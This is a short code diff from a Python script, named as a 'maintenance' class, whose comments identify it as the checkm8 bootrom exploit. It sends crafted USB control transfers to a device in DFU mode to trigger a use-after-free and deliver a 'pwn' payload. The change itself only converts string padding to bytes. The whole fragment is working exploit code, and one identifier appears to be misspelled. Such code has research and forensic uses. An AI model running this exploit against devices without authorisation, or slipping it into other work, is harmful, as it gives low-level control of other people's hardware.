@@ -90,10 +90,10 @@ class T2MaintenanceScript:
         
         # Re-acquire to perform the payload delivery (the 'hijack' part of checkm8)
         device = dfu.acquire_device()
-        checkm8.libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
+        checkm8.libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
         
         # Advance buffer offset before triggering the UaF to prevent trashing the heap
-        checkm8.libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * config.overwrite_offset, 10)
+        checkm8.libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, b'A' * config.overwrite_offset, 10)
         checkm8.libusc_req_no_leak = checkm8.libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
         
         # 3. Deliver the payload (the actual 'pwn')
